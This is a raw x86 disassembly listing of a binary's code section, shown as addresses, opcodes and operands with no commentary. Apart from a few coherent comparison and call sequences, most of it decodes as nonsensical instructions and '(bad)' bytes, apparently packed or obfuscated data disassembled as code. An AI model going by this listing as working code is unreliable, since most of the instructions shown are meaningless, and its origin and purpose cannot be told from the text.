  4119b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119b4:	retf   
  4119b5:	pusha  
  4119b6:	adc    ecx,DWORD PTR [ebx-0xe7e3bab]
  4119bc:	cmp    cl,BYTE PTR [edi]
  4119be:	add    BYTE PTR [eax],al
  4119c0:	or     ecx,eax
  4119c2:	mov    eax,ds:0x422598
  4119c7:	mov    eax,DWORD PTR [eax+0x1d8]
  4119cd:	mov    eax,DWORD PTR [eax]
  4119cf:	xor    esi,0x6665
  4119d5:	or     esi,edx
  4119d7:	add    ecx,0xef6a96a5
  4119dd:	cdq    
  4119de:	adc    esi,0xc8b6a000
  4119e4:	cmp    eax,ecx
  4119e6:	jne    0x4119f4
  4119ec:	cmp    edx,esi
  4119ee:	je     0x411f3d
  4119f4:	mov    eax,DWORD PTR [ebp-0x50]
  4119f7:	jmp    0x411c6c
  4119fc:	loope  0x4119a1
  4119fe:	lods   eax,DWORD PTR ds:[esi]
  4119ff:	aam    0xab
  411a01:	mov    edx,0xd9d49ae0
  411a06:	gs mov esp,0x7edb11b2
  411a0c:	imul   BYTE PTR [esi+0x18]
  411a0f:	sbb    BYTE PTR [ecx+0x14],dh
  411a12:	sbb    BYTE PTR [eax],bl
  411a14:	push   edi
  411a15:	add    DWORD PTR [ecx],ebp
  411a17:	stc    
  411a18:	inc    DWORD PTR [ecx-0x70]
  411a1b:	lahf   
  411a1c:	push   0x28
  411a1e:	jb     0x4119f7
  411a20:	inc    ebp
  411a21:	inc    ecx
  411a22:	adc    DWORD PTR [esi-0x67aae6f3],ebp
  411a28:	xor    al,0x31
  411a2a:	xchg   ebx,eax
  411a2b:	xor    ch,0xec
  411a2e:	sub    WORD PTR [edx-0x4edd44b5],si
  411a35:	loope  0x411a76
  411a37:	adc    eax,0x4a
  411a3a:	mov    esp,0xea7ea54c
  411a3f:	mov    esi,0x44d9e9
  411a44:	ja     0x411a17
  411a46:	inc    ecx
  411a47:	dec    esi
  411a48:	outs   dx,DWORD PTR ds:[esi]
  411a49:	popf   
  411a4a:	sbb    BYTE PTR [ebp+ebp*1+0x5c11f267],0x2b
  411a52:	and    edi,DWORD PTR [ebp-0x617781f]
  411a58:	mov    WORD PTR [edx+esi*2+0x13533257],cx
  411a60:	xor    eax,0xe8f07731
  411a65:	stos   DWORD PTR es:[edi],eax
  411a66:	in     al,0x51
  411a68:	lods   eax,DWORD PTR ds:[esi]
  411a69:	jmp    0x4119ff
  411a6b:	cs test eax,0x685c8a83
  411a71:	mov    ds:0xfe612202,al
  411a76:	pop    eax
  411a77:	daa    
  411a78:	popa   
  411a79:	lahf   
  411a7a:	mov    edx,0x48673ab3
  411a7f:	out    dx,eax
  411a80:	inc    bx
  411a82:	jno    0x411a9f
  411a84:	scas   eax,DWORD PTR es:[edi]
  411a85:	rcr    BYTE PTR [ebx+0x3c],cl
  411a88:	int    0xa9
  411a8a:	ds call 0xc386:0x9af326f1
  411a92:	ret    0x9594
  411a95:	and    al,0x7b
  411a97:	mov    eax,0xb8d0c5e9
  411a9c:	loope  0x411b1c
  411a9e:	mov    dh,0xd3
  411aa0:	pop    DWORD PTR [esp+eax*1-0x65]
  411aa4:	sar    esi,1
  411aa6:	lahf   
  411aa7:	or     edi,edx
  411aa9:	or     cl,BYTE PTR [ebp+0x452485e]
  411aaf:	adc    BYTE PTR [edi-0x5a],bl
  411ab2:	retf   0x678c
  411ab5:	aas    
  411ab6:	int3   
  411ab7:	mov    bl,0x40
  411ab9:	push   cs
  411aba:	push   cs
  411abb:	or     DWORD PTR [esi+0x799987e7],ebp
  411ac1:	ss out dx,eax
  411ac3:	sbb    eax,0x7b937cb0
  411ac8:	in     eax,dx
  411ac9:	or     eax,0xf2c0b39d
  411ace:	cmp    bl,BYTE PTR [ebp-0x4b]
  411ad1:	inc    ebx
  411ad2:	push   ebx
  411ad3:	push   ss
  411ad4:	inc    edx
  411ad5:	inc    edi
  411ad6:	xor    eax,0xb461b55c
  411adb:	mov    edx,0x7e6b3b8b
  411ae0:	push   esi
  411ae1:	adc    edi,DWORD PTR [ecx-0x79]
  411ae4:	jne    0x411b18
  411ae6:	push   edi
  411ae7:	push   ecx
  411ae8:	or     BYTE PTR [edi],bh
  411aea:	lods   al,BYTE PTR ds:[esi]
  411aeb:	pusha  
  411aec:	or     ch,BYTE PTR [edi-0x69]
  411aef:	push   ss
  411af0:	pop    esp
  411af1:	(bad)  
  411af2:	in     eax,dx
  411af3:	addr16 into 
  411af5:	mov    bh,0x43
  411af7:	xor    DWORD PTR [ebx],esp
  411af9:	jl     0x411b4d
  411afb:	scas   eax,DWORD PTR es:[edi]
  411afc:	lods   eax,DWORD PTR ds:[esi]
  411afd:	inc    edi
  411afe:	sub    BYTE PTR [ebp+0x428d7717],0xbc
  411b05:	sub    eax,0x40644f62
  411b0a:	inc    esp
  411b0b:	push   0xa88cdfec
  411b10:	in     al,0xdf
  411b12:	ret    
  411b13:	mov    edi,0xc7656590
  411b18:	mov    dl,0xcf
  411b1a:	inc    ecx
  411b1b:	sub    eax,0x1fd2f2f8
  411b20:	inc    ebx
  411b21:	mov    edi,0x78582e2a
  411b26:	sbb    eax,0x35a911aa
  411b2b:	push   cs
  411b2c:	shl    BYTE PTR [ecx],cl
  411b2e:	xor    al,0x8d
  411b30:	mov    al,0xa
  411b32:	cmc    
  411b33:	call   0xd4259e35
  411b38:	sub    BYTE PTR [ebp+0xe],0x97
  411b3c:	shl    DWORD PTR [esi+edx*2-0x4a54f165],cl
  411b43:	ins    DWORD PTR es:[edi],dx
  411b44:	stos   BYTE PTR es:[edi],al
  411b45:	int3   
  411b46:	xchg   edi,edi
  411b48:	retf   0x9240
  411b4b:	cld    
  411b4c:	dec    edi
  411b4d:	out    dx,al
  411b4e:	pop    ds
  411b4f:	jmp    0xb21b2d8c
  411b54:	lock and ebp,DWORD PTR [edi+ecx*2]
  411b58:	and    ebx,DWORD PTR [ebx]
  411b5a:	push   0x6d
  411b5c:	push   edx
  411b5d:	test   eax,0xf583c06e
  411b62:	or     DWORD PTR [esi+eiz*2],0x54e1ad18
  411b69:	(bad)  
  411b6a:	out    dx,eax
  411b6b:	std    
  411b6c:	xor    eax,0xa6500f1d
  411b71:	jge    0x411b25
  411b73:	jge    0x411b8d
  411b75:	or     al,0xdc
  411b77:	push   ds
  411b78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b79:	cmp    cl,BYTE PTR [edx-0x6a]
  411b7c:	mov    ds:0x1d8af7dc,al
  411b81:	push   edi
  411b82:	mov    edi,0x8cc09548
  411b87:	pop    esi
  411b88:	and    DWORD PTR [eax],eax
  411b8a:	lea    edx,[eax+0x5d52da14]
  411b90:	mov    bl,0x93
  411b92:	xor    esi,DWORD PTR [ebx+0x1c]
  411b95:	mov    ecx,0xe36d9856
  411b9a:	in     al,0x96
  411b9c:	xchg   ecx,eax
  411b9d:	lock addr16 int3 
  411ba0:	xchg   ecx,eax
  411ba1:	inc    edi
  411ba2:	out    dx,eax
  411ba3:	leave  
  411ba4:	xchg   esi,eax
  411ba5:	xor    ebp,DWORD PTR [ebx]
  411ba7:	clc    
  411ba8:	outs   dx,BYTE PTR ds:[esi]
  411ba9:	out    0x4e,al
  411bab:	mov    ds,WORD PTR [esp+ebp*8-0x2]
  411baf:	xor    eax,DWORD PTR gs:[edi-0x4]
  411bb3:	pop    ebp
  411bb4:	out    0x73,eax
  411bb6:	mov    ebx,0x8c8b03b
  411bbb:	dec    eax
  411bbc:	sbb    esi,edi
  411bbe:	dec    ebx
  411bbf:	mov    ecx,0x9fcef269
  411bc4:	mov    ds:0xaa54dc22,al
  411bc9:	repz mov cl,0xf3
  411bcc:	popf   
  411bcd:	cdq    
  411bce:	xor    eax,0xf18bbb28
  411bd3:	je     0x411c4e
  411bd5:	jo     0x411c13
  411bd7:	and    al,0xeb
  411bd9:	iret   
  411bda:	nop
  411bdb:	in     eax,0x6f
  411bdd:	idiv   cl
  411bdf:	push   ebp
  411be0:	aam    0x61
  411be2:	xchg   BYTE PTR [ebx],dl
  411be4:	and    DWORD PTR [eax],edi
  411be6:	loope  0x411c52
  411be8:	or     DWORD PTR [ebp+0x28],edx
  411beb:	mov    ds:0xb3c31cd6,eax
  411bf0:	mov    gs,ebx
  411bf2:	pop    ebx
  411bf3:	shr    DWORD PTR [edx-0x79],cl
  411bf6:	push   cs
  411bf7:	xchg   DWORD PTR [esi-0x2e],edx
  411bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bfb:	jg     0x411c03
  411bfd:	ret    
  411bfe:	out    0x82,al
  411c00:	pop    ss
  411c01:	ror    BYTE PTR [edx+0x6a],cl
  411c04:	faddp  st(6),st
  411c06:	cmp    DWORD PTR [esp+ecx*1-0x99f107e],edx
  411c0d:	xchg   esi,eax
  411c0e:	and    eax,DWORD PTR [edx]
  411c10:	jl     0x411c3d
  411c12:	push   esp
  411c13:	shl    DWORD PTR [ebp+0x76],1
  411c16:	mov    edi,0x62ed944a
  411c1b:	push   cs
  411c1c:	fwait
  411c1d:	scas   al,BYTE PTR es:[edi]
  411c1e:	jns    0x411c84
  411c20:	popa   
  411c21:	(bad)  
  411c22:	xor    al,0x4d
  411c24:	mov    ebp,0xff2ca974
  411c29:	lods   eax,DWORD PTR ds:[esi]
  411c2a:	je     0x411c09
  411c2c:	add    al,ch
  411c2e:	cli    
  411c2f:	enter  0x9dcd,0xd5
  411c33:	aam    0xa8
  411c35:	(bad)  
  411c36:	push   0xd84cf700
  411c3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c3c:	dec    eax
  411c3d:	inc    ebp
  411c3e:	sub    eax,0x950b58c1
  411c43:	int    0x73
  411c45:	rol    BYTE PTR [ecx],1
  411c47:	pop    esp
  411c48:	(bad)  
  411c49:	pop    DWORD PTR [ebx-0x4aa436d1]
  411c4f:	iret   
  411c50:	mov    ds:0xd581fc64,al
  411c55:	arpl   WORD PTR [ebp+0x35771b7f],sp
  411c5b:	inc    edi
  411c5c:	fwait
  411c5d:	(bad)  
  411c5e:	push   ss
  411c5f:	and    ch,ah
  411c61:	cld    
  411c62:	ins    BYTE PTR es:[edi],dx
  411c63:	pushf  
  411c64:	mov    dl,0x53
  411c66:	inc    ebp
  411c67:	sahf   
  411c68:	ret    
  411c69:	mov    ch,BYTE PTR [edx]
  411c6b:	mov    ecx,DWORD PTR gs:[ebp-0x4c]
  411c6f:	mov    edx,DWORD PTR [ebp-0x60]
  411c72:	mov    esi,DWORD PTR [ebp-0x5c]
  411c75:	add    eax,0x7818
  411c7a:	adc    ecx,0x87
  411c80:	or     eax,edx
  411c82:	mov    edx,DWORD PTR [ebp-0x70]
  411c85:	jmp    0x411efa
  411c8a:	pop    ebp
  411c8b:	and    DWORD PTR [esi],esi
  411c8d:	xor    bh,BYTE PTR ds:[esi]
  411c90:	pop    ebp
  411c91:	sbb    bh,BYTE PTR [edi+edi*8+0x2a326a08]
  411c98:	fistp  QWORD PTR [esi+0x4f]
  411c9b:	push   0x18
  411c9d:	sbb    BYTE PTR [ecx+0x14],dh
  411ca0:	sbb    BYTE PTR [eax],bl
  411ca2:	push   edi
  411ca3:	xchg   edi,eax
  411ca4:	aaa    
  411ca5:	stc    
  411ca6:	dec    esi
  411ca7:	pop    es
  411ca8:	jp     0x411ce7
  411caa:	(bad)  
  411cab:	or     al,0xeb
  411cad:	cli    
  411cae:	add    BYTE PTR [ebx+eax*2],ah
  411cb1:	or     al,0xbf
  411cb3:	mov    edx,0xf19f8a9
  411cb8:	pushf  
  411cb9:	pop    es
  411cba:	jle    0x411ca8
  411cbc:	stc    
  411cbd:	jl     0x411cf7
  411cbf:	jno    0x411cda
  411cc1:	inc    esp
  411cc2:	data16 jle 0x411cb4
  411cc5:	fldcw  WORD PTR [ebx-0x6d]
  411cc8:	sub    BYTE PTR [edi],dh
  411cca:	jmp    0x3c697ee4
  411ccf:	imul   esi,edx,0x75
  411cd2:	aam    0x58
  411cd4:	adc    BYTE PTR [edx+0x33],dh
  411cd7:	hlt    
  411cd8:	jne    0x411c8e
  411cda:	aam    0xe7
  411cdc:	sahf   
  411cdd:	mov    eax,0x8088956d
  411ce2:	inc    ebx
  411ce3:	test   eax,0x2c666fac
  411ce8:	(bad)  
  411ce9:	int3   
  411cea:	adc    esi,ebp
  411cec:	jno    0x411cd3
  411cee:	xor    ch,al
  411cf0:	mov    ch,0xfd
  411cf2:	lods   eax,DWORD PTR ds:[esi]
  411cf3:	pop    ebp
  411cf4:	inc    edi
  411cf5:	rol    esp,1
  411cf7:	xchg   edi,eax
  411cf8:	or     al,0x39
  411cfa:	lods   al,BYTE PTR ds:[esi]
  411cfb:	jmp    0x411d6a
  411cfd:	xchg   ch,dh
  411cff:	jl     0x411d22
  411d01:	inc    esi
  411d02:	xor    eax,0xbf2cc7f0
  411d07:	retf   
  411d08:	(bad)  
  411d09:	mov    edx,0xcc2ef81e
  411d0e:	inc    eax
  411d0f:	or     BYTE PTR [eax],bh
  411d11:	fcmovu st,st(6)
  411d13:	leave  
  411d14:	and    eax,0xafdaa92
  411d19:	cld    
  411d1a:	shl    BYTE PTR [eax-0x5e706c6e],1
  411d20:	rol    DWORD PTR [ecx],0x8d
  411d23:	es out 0x15,eax
  411d26:	xor    BYTE PTR [ecx+0x312abe08],bh
  411d2c:	mov    eax,DWORD PTR [esi+0xa23ed4d]
  411d32:	sahf   
  411d33:	sahf   
  411d34:	call   0x7d8f:0x33f98dd6
  411d3b:	sbb    ch,ah
  411d3d:	ret    0x2f01
  411d40:	mov    eax,0x8eddf0f6
  411d45:	jne    0x411d35
  411d47:	iret   
  411d48:	retf   0x5477
  411d4b:	rcl    DWORD PTR [esi],1
  411d4d:	loopne 0x411d35
  411d4f:	out    0x4e,eax
  411d51:	mov    ch,0x88
  411d53:	mov    eax,0x5e73bffa
  411d58:	add    eax,0x50a82ba9
  411d5d:	cmc    
  411d5e:	scas   al,BYTE PTR es:[edi]
  411d5f:	jmp    0x411ce6
  411d61:	and    al,0xab
  411d63:	mov    bh,0xb
  411d65:	int3   
  411d66:	adc    dh,ch
  411d68:	clc    
  411d69:	or     BYTE PTR [esi-0x570557c1],dl
  411d6f:	jmp    0x5f8d:0xbdaeee4b
  411d76:	sbb    DWORD PTR [edx],ecx
  411d78:	jnp    0x411dac
  411d7a:	fs push esp
  411d7c:	fadd   DWORD PTR [esi+eax*8]
  411d7f:	ret    0xedb0
  411d82:	dec    ebx
  411d83:	out    0xa,eax
  411d85:	out    0xe2,eax
  411d87:	inc    edi
  411d88:	ds mov ecx,0xfd124ba7
  411d8e:	cmp    eax,DWORD PTR [eax]
  411d90:	xor    ah,BYTE PTR [eax]
  411d92:	inc    ecx
  411d93:	push   ebp
  411d94:	iret   
  411d95:	cwde   
  411d96:	enter  0xbecf,0x5d
  411d9a:	dec    edx
  411d9b:	ret    
  411d9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d9d:	jae    0x411dfb
  411d9f:	sub    al,0x5a
  411da1:	dec    ebx
  411da2:	xor    bl,bl
  411da4:	jae    0x411d8a
  411da6:	fcmovnbe st,st(0)
  411da8:	fidivr DWORD PTR [ecx-0x383fbe97]
  411dae:	inc    eax
  411daf:	sub    BYTE PTR [eax],bl
  411db1:	sub    eax,0xc441784
  411db6:	jne    0x411dfa
  411db8:	add    DWORD PTR [eax],esi
  411dba:	inc    ebp
  411dbb:	data16 mov cl,0xb0
  411dbe:	mov    al,ds:0x59a69e88
  411dc3:	ins    DWORD PTR es:[edi],dx
  411dc4:	pop    eax
  411dc5:	(bad)  
  411dc6:	fstp   QWORD PTR [ecx-0x15]
  411dc9:	retf   
  411dca:	xlat   BYTE PTR ds:[ebx]
  411dcb:	adc    DWORD PTR [edi-0x75],0x6e
  411dcf:	xor    edi,DWORD PTR [esp+eax*4+0x8]
  411dd3:	jbe    0x411d7e
  411dd5:	hlt    
  411dd6:	or     al,al
  411dd8:	and    DWORD PTR [edi+0x726fefbf],esp
  411dde:	stos   DWORD PTR es:[edi],eax
  411ddf:	sbb    al,0xaf
  411de1:	(bad)  
  411de2:	retf   
  411de3:	jbe    0x411e60
  411de5:	pop    ss
  411de6:	and    al,0xde
  411de8:	inc    esp
  411de9:	ins    DWORD PTR es:[edi],dx
  411dea:	and    BYTE PTR [ecx-0x25ee3e5f],cl
  411df0:	in     eax,0xc7
  411df2:	pop    ss
  411df3:	cdq    
  411df4:	popf   
  411df5:	mov    ch,0x45
  411df7:	pushf  
  411df8:	arpl   WORD PTR [eax-0x393735ba],bp
  411dfe:	xchg   edi,eax
  411dff:	sub    eax,0xe2699ced
  411e04:	xor    DWORD PTR [eax],eax
  411e06:	pushf  
  411e07:	int3   
  411e08:	dec    ebx
  411e09:	xchg   edx,eax
  411e0a:	xor    esi,DWORD PTR [ebp+0x42]
  411e0d:	jl     0x411d9e
  411e0f:	add    al,0xc5
  411e11:	les    ecx,FWORD PTR [eax+0x6]
  411e14:	cwde   
  411e15:	div    DWORD PTR [esi+0x31]
  411e18:	cmc    
  411e19:	lods   al,BYTE PTR ds:[esi]
  411e1a:	popa   
  411e1b:	mov    bl,0x9d
  411e1d:	icebp  
  411e1e:	test   DWORD PTR [ecx],ebp
  411e20:	pop    esi
  411e21:	stc    
  411e22:	and    ah,BYTE PTR [ecx-0x4f]
  411e25:	jnp    0x411e28
  411e27:	rol    DWORD PTR [edx],cl
  411e29:	dec    ebp
  411e2a:	push   cs
  411e2b:	lds    ebp,FWORD PTR [esi+0x66]
  411e2e:	test   DWORD PTR [esi-0x3e],edx
  411e31:	mov    bh,0xcc
  411e33:	pop    eax
  411e34:	jb     0x411e6b
  411e36:	jmp    DWORD PTR [ecx-0x60]
  411e39:	add    esp,DWORD PTR [eax+0x5bc45f44]
  411e3f:	sar    ch,1
  411e41:	mov    al,0xc9
  411e43:	sub    ebx,DWORD PTR [ebx]
  411e45:	daa    
  411e46:	adc    DWORD PTR [ebx],esi
  411e48:	call   0x7471:0xf56c525f
  411e4f:	mov    WORD PTR [eax],ds
  411e51:	xor    BYTE PTR [ecx+0x3d072643],0x47
  411e58:	ret    
  411e59:	push   cs
  411e5a:	pop    ebp
  411e5b:	dec    esp
  411e5c:	gs pop esp
  411e5e:	out    0x55,ax
  411e61:	adc    eax,0x38589184
  411e66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e67:	xlat   BYTE PTR ds:[ebx]
  411e68:	cmp    ch,BYTE PTR [ebx-0x167b7c44]
  411e6e:	inc    ebx
  411e6f:	xchg   esp,eax
  411e70:	jno    0x411e40
  411e72:	dec    edx
  411e73:	mov    al,ds:0xedbed23e
  411e78:	(bad)  
  411e79:	sbb    eax,0xedfa327
  411e7e:	jbe    0x411e1d
  411e80:	fcom   QWORD PTR [edx]
  411e82:	jnp    0x411e5b
  411e84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e85:	je     0x411ea1
  411e87:	pop    edx
  411e88:	ins    BYTE PTR es:[edi],dx
  411e89:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  411e8b:	jb     0x411ecf
  411e8d:	out    0x1c,eax
  411e8f:	push   esi
  411e90:	mov    al,0xa5
  411e92:	and    ch,BYTE PTR [esi+0x75]
  411e95:	aad    0x45
  411e97:	adc    ah,BYTE PTR [eax-0x10]
  411e9a:	call   0x1d12ad4e
  411e9f:	nop
  411ea0:	in     al,dx
  411ea1:	inc    ecx
  411ea2:	enter  0xb701,0x45
  411ea6:	imul   ebp,DWORD PTR [eax-0x56],0xffffffed
  411eaa:	xchg   BYTE PTR [esi+0x11f40c0c],bl
  411eb0:	emms   
  411eb2:	mov    ebx,0x6a5b18e7
  411eb7:	out    dx,eax
  411eb8:	jns    0x411ecd
  411eba:	mov    bh,0x6e
  411ebc:	xor    ebx,DWORD PTR [ebx-0x7fcfd38e]
  411ec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ec3:	shr    BYTE PTR [ebp+0x6e],1
  411ec6:	imul   ebp,esp,0xffffffad
  411ec9:	in     eax,dx
  411eca:	pop    esi
  411ecb:	test   DWORD PTR [edi*2+0xf71b4ff],esi
  411ed2:	xchg   edx,eax
  411ed3:	sbb    al,0x86
  411ed5:	inc    edi
  411ed6:	jb     0x411f0c
  411ed8:	mov    al,0xb4
  411eda:	ror    DWORD PTR [eax-0x45],0x75
  411ede:	imul   eax,ebp,0x79
  411ee1:	add    edx,DWORD PTR [esi]
  411ee3:	and    al,0xd9
  411ee5:	cmp    al,0xc0
  411ee7:	dec    eax
  411ee8:	or     al,0xe
  411eea:	test   BYTE PTR [edi],al
  411eec:	nop
  411eed:	sbb    ebp,DWORD PTR [esi+0xced897]
  411ef3:	cmp    BYTE PTR [eax+ebp*8],ah
  411ef6:	add    eax,0xb0df18b
  411efb:	into   
  411efc:	mov    esi,DWORD PTR [ebp-0x6c]
  411eff:	push   esi
  411f00:	push   edx
  411f01:	push   ecx
  411f02:	push   eax
  411f03:	call   0x416c20
  411f08:	mov    ecx,DWORD PTR [ebp-0x80]
  411f0b:	mov    esi,DWORD PTR [ebp-0x7c]
  411f0e:	and    eax,ecx
  411f10:	mov    ecx,DWORD PTR ds:0x422598
  411f16:	mov    ecx,DWORD PTR [ecx+0x1d0]
  411f1c:	mov    ecx,DWORD PTR [ecx]
  411f1e:	and    edx,esi
  411f20:	xor    eax,0x2b01
  411f25:	xor    edx,0x2021
  411f2b:	xor    esi,esi
  411f2d:	cmp    ecx,eax
  411f2f:	jne    0x4127da
  411f35:	cmp    esi,edx
  411f37:	jne    0x4127da
  411f3d:	mov    eax,DWORD PTR [ebp-0xa4]
  411f43:	mov    ecx,DWORD PTR [ebp-0xc]
  411f46:	add    eax,0x80ca
  411f4b:	or     eax,ecx
  411f4d:	mov    ecx,DWORD PTR ds:0x422634
  411f53:	or     eax,0x686
  411f58:	xor    eax,0x3eec
  411f5d:	lea    eax,[eax+ecx*1-0xc11b]
  411f64:	xor    DWORD PTR ds:0x42262c,eax
  411f6a:	mov    eax,DWORD PTR [ebp-0x64]
  411f6d:	and    eax,0x4dff
  411f72:	add    eax,DWORD PTR [ebp-0x14]
  411f75:	mov    ecx,DWORD PTR [ebp-0x94]
  411f7b:	xor    eax,0x676c
  411f80:	xor    edx,edx
  411f82:	div    ecx
  411f84:	mov    ecx,DWORD PTR [ebp-0x24]
  411f87:	mov    edx,DWORD PTR [ebp-0x74]
  411f8a:	xor    ecx,0x6e1e
  411f90:	imul   ecx,edx
  411f93:	mov    edx,DWORD PTR [ebp+0x8]
  411f96:	push   0x4
  411f98:	jmp    0x41220d
  411f9d:	mov    gs,WORD PTR [esp+ecx*4-0x7c]
  411fa1:	push   0x64
  411fa3:	jle    0x411fff
  411fa5:	inc    ebp
  411fa6:	inc    ecx
  411fa7:	jne    0x412025
  411fa9:	rcr    bh,1
  411fab:	xor    ebp,DWORD PTR [edx-0x5a]
  411fae:	data16 sbb BYTE PTR [eax],bl
  411fb1:	jno    0x411fc7
  411fb3:	sbb    BYTE PTR [eax],bl
  411fb5:	lahf   
  411fb6:	dec    eax
  411fb7:	test   BYTE PTR [esi],ah
  411fb9:	das    
  411fba:	inc    ebx
  411fbb:	or     BYTE PTR [esi+0x1e],ch
  411fbe:	jbe    0x411fbe
  411fc0:	loope  0x412006
  411fc2:	mov    al,ds:0x91d07a8b
  411fc7:	adc    eax,ecx
  411fc9:	mov    ch,0x6b
  411fcb:	imul   ecx,DWORD PTR [ebp+0x3e01bdb9],0x3e
  411fd2:	and    al,0x54
  411fd4:	popf   
  411fd5:	or     DWORD PTR [eax-0x14],0x3a
  411fd9:	sbb    BYTE PTR [esi],al
  411fdb:	xor    al,0x3e
  411fdd:	je     0x411f79
  411fdf:	sub    DWORD PTR [ebx],esi
  411fe1:	lock outs dx,BYTE PTR ds:[esi]
  411fe3:	pop    ss
  411fe4:	inc    edx
  411fe5:	sub    eax,0xffffffe6
  411fe8:	jae    0x411f95
  411fea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411feb:	ficom  WORD PTR [ebx-0xdf6384b]
  411ff1:	mov    bl,BYTE PTR [edx+ebx*2]
  411ff4:	jl     0x411fbe
  411ff6:	retf   0xa142
  411ff9:	jmp    0x3385:0x3705c2d5
  412000:	or     al,dl
  412002:	out    dx,eax
  412003:	sahf   
  412004:	add    cl,BYTE PTR [edx]
  412006:	clc    
  412007:	dec    esi
  412008:	xchg   al,ch
  41200a:	pop    eax
  41200b:	sub    DWORD PTR [eax],esp
  41200d:	or     esp,DWORD PTR [ecx-0x6e]
  412010:	xor    DWORD PTR [ecx-0x20],edi
  412013:	inc    ecx
  412014:	push   ebp
  412015:	push   0x173ba35a
  41201a:	jae    0x411ff5
  41201c:	cs mov ebx,0x6a3eaf7b
  412022:	and    eax,0x76ec7efa
  412027:	mov    al,ds:0x540fd3a8
  41202c:	push   ecx
  41202d:	pop    esp
  41202e:	jge    0x412069
  412030:	cwde   
  412031:	pop    esi
  412032:	(bad)  
  412033:	stc    
  412034:	ja     0x41208c
  412036:	xchg   edx,eax
  412037:	mov    bl,BYTE PTR [esi-0x11]
  41203a:	and    ah,BYTE PTR [eax+0x11]
  41203d:	scas   eax,DWORD PTR es:[edi]
  41203e:	xlat   BYTE PTR ds:[ebx]
  41203f:	lods   eax,DWORD PTR ds:[esi]
  412040:	ins    BYTE PTR es:[edi],dx
  412041:	mov    eax,0xfbed7800
  412046:	(bad)  
  412047:	in     eax,dx
  412048:	loope  0x412051
  41204a:	dec    ebp
  41204b:	adc    al,0xd
  41204d:	cmp    al,0x6e
  41204f:	lock sbb BYTE PTR [edx+0x35],cl
  412053:	pop    ebp
  412054:	jns    0x411fe6
  412056:	loope  0x412094
  412058:	sbb    BYTE PTR [ebp+0xd],ah
  41205b:	ja     0x412082
  41205d:	in     al,dx
  41205e:	pushf  
  41205f:	mov    edx,0x9eaf0599
  412064:	fmul   DWORD PTR ds:[edx]
  412067:	dec    ebx
  412068:	repz test al,0x22
  41206b:	sahf   
  41206c:	enter  0xf501,0xd4
  412070:	test   bl,dl
  412072:	cmp    edx,DWORD PTR [edi]
  412074:	push   esp
  412075:	into   
  412076:	ss cwde 
  412078:	sub    eax,0xbbb15ae3
  41207d:	cwde   
  41207e:	les    edx,FWORD PTR [eax]
  412080:	cwde   
  412081:	pusha  
  412082:	mov    edx,0xfdaac65c
  412087:	or     dl,BYTE PTR [edx]
  412089:	pop    edx
  41208a:	daa    
  41208b:	mov    cl,0x8a
  41208d:	jb     0x41210d
  41208f:	sbb    ecx,DWORD PTR [ebp-0x7]
  412092:	jo     0x41209a
  412094:	mov    dl,0x5f
  412096:	adc    eax,0xbf6f3bc
  41209b:	sbb    cl,dl
  41209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41209e:	adc    BYTE PTR [edi+0x5ffad523],dl
  4120a4:	sub    BYTE PTR [edi-0x30],al
  4120a7:	mov    cl,0x5b
  4120a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120aa:	push   ds
  4120ab:	push   edx
  4120ac:	cmp    ebx,ecx
  4120ae:	cmc    
  4120af:	ins    BYTE PTR es:[edi],dx
  4120b0:	inc    ebx
  4120b1:	arpl   WORD PTR [ebp+0x3f],cx
  4120b4:	(bad)
  4120b7:	fwait
  4120b8:	push   edi
  4120b9:	inc    edi
  4120ba:	mov    ds:0xcc76e8fd,eax
  4120bf:	mov    ecx,0x1bc1205d
  4120c4:	lahf   
  4120c5:	cmp    eax,0x7a4b0163
  4120ca:	adc    BYTE PTR [eax-0x22ca0591],dl
  4120d0:	sub    edx,0x31
  4120d3:	cmp    al,0x9
  4120d5:	call   0x3c3a7189
  4120da:	dec    ebp
  4120db:	jb     0x412077
  4120dd:	js     0x41214b
  4120df:	mov    ebx,0x70e3bc7d
  4120e4:	sub    eax,0x45a7b9e0
  4120e9:	ret    0x6d97
  4120ec:	rcr    DWORD PTR [ebp+0x5f],cl
  4120ef:	fwait
  4120f0:	aad    0x38
  4120f2:	in     eax,dx
  4120f3:	out    0x95,al
  4120f5:	sub    ch,BYTE PTR [eax]
  4120f7:	add    al,0x5
  4120f9:	xchg   edi,eax
  4120fa:	rol    eax,0xbe
  4120fd:	lods   eax,DWORD PTR ds:[esi]
  4120fe:	jp     0x41208d
  412100:	pop    ss
  412101:	and    al,0x8d
  412103:	mov    ecx,?
  412105:	stos   DWORD PTR es:[edi],eax
  412106:	push   ebp
  412107:	cwde   
  412108:	pop    ebp
  412109:	ins    BYTE PTR es:[edi],dx
  41210a:	jne    0x41208e
  41210c:	add    al,0xaa
  41210e:	out    0x73,eax
  412110:	xchg   BYTE PTR [esi+0x37],bl
  412113:	sbb    ecx,ebp
  412115:	cli    
  412116:	repnz mov al,ds:0x9884ef1b
  41211c:	mov    dh,0x13
  41211e:	dec    esi
  41211f:	stc    
  412120:	jge    0x4120d7
  412122:	fimul  DWORD PTR [eax+0x3527bf26]
  412128:	add    BYTE PTR [edx+0x1a],0x23
  41212c:	pop    ebx
  41212d:	push   esp
  41212e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41212f:	mov    ch,0x30
  412131:	xchg   edi,eax
  412132:	jo     0x4120f3
  412134:	push   ebx
  412135:	icebp  
  412136:	jb     0x41216d
  412138:	(bad)
  41213c:	mov    WORD PTR [esi-0x7a1ccc58],ss
  412142:	retf   
  412143:	sti    
  412144:	adc    ch,bl
  412146:	or     DWORD PTR [eax+0x70],ebp
  412149:	int3   
  41214a:	js     0x4120f1
  41214c:	ds fs pop es
  41214f:	in     eax,0x81
  412151:	pop    ss
  412152:	aas    
  412153:	(bad)  
  412154:	sbb    al,0xd2
